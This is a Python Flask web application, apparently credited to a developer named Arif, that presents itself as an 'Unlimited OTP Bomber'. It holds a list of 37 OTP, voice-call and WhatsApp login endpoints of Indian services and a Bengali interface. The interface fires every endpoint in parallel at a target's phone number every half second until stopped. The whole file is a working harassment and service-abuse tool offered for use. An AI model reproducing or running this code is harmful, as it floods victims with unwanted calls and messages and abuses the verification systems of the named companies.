import os
import requests
import concurrent.futures
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

APIS = [       {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G998B)"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Rapido Voice Call", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zepto Voice Call", "url": "https://api.zeptonow.com/api/v3/customer/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'},
    {"name": "Blinkit Voice Call", "url": "https://blinkit.com/v1/user/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","otp_type":"call"}}'},
    {"name": "JioMart Voice Call", "url": "https://www.jiomart.com/api/v1/auth/generate_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"name": "MyGlamm WhatsApp", "url": "https://api.myglamm.com/api/v1/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","channel":"whatsapp"}}'},
    {"name": "Purplle WhatsApp", "url": "https://www.purplle.com/api/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","source":"whatsapp"}}'},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobiles={phone}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
]

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔁 Unlimited OTP Bomber | CYBER TOOLS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', system-ui;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(20, 28, 40, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 48px;
            border: 1px solid rgba(72, 187, 255, 0.3);
            width: 100%;
            max-width: 600px;
            padding: 32px 28px;
        }
        .tool-name { text-align: center; font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg,#FFD966,#FF8C42); -webkit-background-clip: text; background-clip: text; color: transparent; }
        h1 { text-align: center; font-size: 2rem; background: linear-gradient(135deg,#FFF,#7AC8FF); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 10px 0; }
        .sub { text-align: center; color: #8e9aaf; margin-bottom: 28px; }
        .input-group { margin-bottom: 20px; }
        label { color: #ccd6f0; display: block; margin-bottom: 8px; }
        .phone-field {
            display: flex;
            background: #0f1420;
            border-radius: 60px;
            border: 1px solid #2a3246;
        }
        .country-code { background: #1a1f2e; padding: 14px 18px; border-radius: 60px 0 0 60px; color: #b9c3db; border-right: 1px solid #2a3246; }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 16px;
            color: white;
            font-size: 1rem;
            outline: none;
        }
        button {
            width: 100%;
            background: linear-gradient(95deg, #2563eb, #1e40af);
            border: none;
            padding: 14px;
            border-radius: 60px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { transform: scale(0.98); }
        #stopBtn { background: #7a2c2c; }
        .output-box {
            background: #0b0f18;
            border-radius: 28px;
            padding: 18px;
            margin-top: 25px;
            max-height: 400px;
            overflow-y: auto;
        }
        pre { font-family: monospace; font-size: 0.7rem; color: #a5f3c3; white-space: pre-wrap; }
        .badge, .developer { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #6c7a8e; }
    </style>
</head>
<body>
<div class="glass-card">
    <div class="tool-name">🔥 CYBER TOOLS 🔥</div>
    <h1>UNLIMITED OTP BOMBER</h1>
    <div class="sub">💣 সারাদিন ধরে OTP কল/এসএমএস/হোয়াটসঅ্যাপ</div>

    <div class="input-group">
        <label>📱 ফোন নম্বর (10 ডিজিট)</label>
        <div class="phone-field">
            <span class="country-code">+91</span>
            <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
        </div>
    </div>

    <button id="startBtn">🔁 START UNLIMITED (until STOP)</button>
    <button id="stopBtn">🛑 STOP</button>

    <div class="output-box">
        <pre id="output">⚡ রেডি। নম্বর দিন ও START চাপুন। সারাদিন চলবে।</pre>
    </div>
    <div class="badge">🔥 50+ APIs | প্রতি রাউন্ডে 0.5 সেকেন্ড বিরতি</div>
    <div class="developer">👨‍💻 Developer: Arif</div>
</div>
<script>
    let running = false;
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const phoneInput = document.getElementById('phone');
    const outputPre = document.getElementById('output');

    async function sendOneRound(phone) {
        const response = await fetch('/bomb', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone })
        });
        const data = await response.json();
        return data.log;
    }

    startBtn.onclick = async () => {
        if (running) {
            outputPre.innerText += '\n⚠️ ইতিমধ্যে চলছে। আগে STOP চাপুন।\n';
            return;
        }
        let phone = phoneInput.value.trim();
        if (!phone || phone.length !== 10 || isNaN(phone)) {
            outputPre.innerText = '❌ ভুল নম্বর! 10 ডিজিট দিন।';
            return;
        }
        running = true;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        outputPre.innerText = '🌀 শুরু হয়েছে... সারাদিন যাবে। থামাতে STOP চাপুন।\n';
        let round = 0;
        while (running) {
            round++;
            outputPre.innerText += `\n--- Round ${round} ---\n`;
            try {
                let log = await sendOneRound(phone);
                outputPre.innerText += log + '\n';
            } catch(e) {
                outputPre.innerText += `⚠️ নেটওয়ার্ক এরর: ${e}\n`;
            }
            // 0.5 সেকেন্ড দেরি, ইচ্ছে করলে 0.2 করতে পারো
            await new Promise(r => setTimeout(r, 500));
        }
        startBtn.disabled = false;
        stopBtn.disabled = true;
        outputPre.innerText += '\n✅ STOP চাপানো হয়েছে। বন্ধ।\n';
    };

    stopBtn.onclick = () => {
        running = false;
    };
    stopBtn.disabled = true;
</script>
</body>
</html>
"""

def send_request(api, phone):
    try:
        url = api['url'](phone) if callable(api['url']) else api['url']
        headers = api['headers']
        data = None
        if api.get('data'):
            data = api['data'](phone) if callable(api['data']) else api['data']
        if api['method'] == 'POST':
            r = requests.post(url, headers=headers, data=data, timeout=5)
        else:
            r = requests.get(url, headers=headers, timeout=5)
        return f"[+] {api['name']} → {r.status_code}"
    except Exception as e:
        return f"[-] {api['name']} → {str(e)[:50]}"

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/bomb', methods=['POST'])
def bomb():
    phone = request.json.get('phone')
    if not phone:
        return jsonify({"log": "Phone required"}), 400
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(send_request, api, phone) for api in APIS]
        logs = [f.result() for f in concurrent.futures.as_completed(futures)]
    return jsonify({"log": "\n".join(logs)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
